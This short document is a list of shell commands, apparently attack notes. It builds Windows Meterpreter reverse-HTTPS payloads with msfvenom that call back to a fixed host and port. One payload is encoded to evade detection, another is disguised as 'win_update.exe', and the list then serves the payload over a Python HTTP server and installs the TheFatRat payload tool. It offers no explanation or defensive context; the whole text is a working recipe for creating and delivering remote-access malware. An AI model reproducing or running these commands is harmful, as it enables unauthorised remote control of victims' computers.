msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.105 LPORT=443 -f exe -o ~/payload.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.105 LPORT=443 -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.105 LPORT=443 -f exe -o ~/win_update.exe


python3 -m http.server 8080

http://192.168.1.105:8080/payload.exe


git clone https://github.com/Screetsec/TheFatRat.git
cd TheFatRat
chmod +x setup.sh
sudo ./setup.sh
